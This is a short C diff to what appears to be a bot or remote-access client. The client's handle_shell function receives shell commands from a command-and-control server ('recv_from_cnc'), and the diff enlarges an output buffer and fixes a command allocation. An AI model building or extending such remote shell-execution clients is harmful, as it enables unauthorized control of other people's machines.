@@ -5,6 +5,8 @@
 #include "logger.h"
 #include "commander.h"
 
+#define OUTPUT_BUFSIZE 8192
+
 void handle_echo()
 {
     int ret;
@@ -46,7 +48,7 @@ void handle_shell()
     int ret;
     unsigned int bytes_read;
     struct shell_cmd cmd;
-    char out[4096];
+    char out[OUTPUT_BUFSIZE];
 
     log_info("Received SHELL command.");
     ret = recv_from_cnc(&cmd.cmd_len, sizeof(cmd.cmd_len));
@@ -55,7 +57,7 @@ void handle_shell()
         log_error("Received invalid shell command length.");
         return;
     }
-    cmd.cmd = malloc(cmd.cmd_len);
+    cmd.cmd = malloc(cmd.cmd_len + 1);
     if (!cmd.cmd)
     {
         log_error("Failed to allocate memory for the shell command.");
